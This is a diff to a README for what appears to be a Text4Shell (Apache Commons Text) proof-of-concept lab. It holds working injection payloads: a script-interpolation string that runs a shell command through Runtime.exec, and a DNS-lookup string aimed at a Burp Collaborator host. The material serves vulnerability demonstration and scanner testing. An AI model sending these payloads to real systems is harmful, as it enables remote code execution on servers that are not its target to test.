@@ -43,9 +43,12 @@ OR Send payloads to /blind with payload as your userAgent
 Sample Exploit Payloads
 ```
 ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/itworked')}
+```
+```
 ${dns:<burp collaborator host>)}
 ```
 
+Recommended URL encoder for successful exploit demonstration: [https://www.urlencoder.org/](https://www.urlencoder.org/).
 
 # Docker
 Alternatively you can use Docker to be able to run this PoC:
@@ -78,10 +81,14 @@ http://localhost/
 
 ```
 ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
+```
+```
 ${dns:<burp collaborator host>)}
 ```
 
-Alternatively you can validate the effectiveness of scanning tools such as[text4shell-scan](https://github.com/securekomodo/text4shell-scan)
+Recommended URL encoder for successful exploit demonstration: [https://www.urlencoder.org/](https://www.urlencoder.org/).
+
+Alternatively you can validate the effectiveness of scanning tools such as [text4shell-scan](https://github.com/securekomodo/text4shell-scan)
 
 
 # Are You Vulnerable?
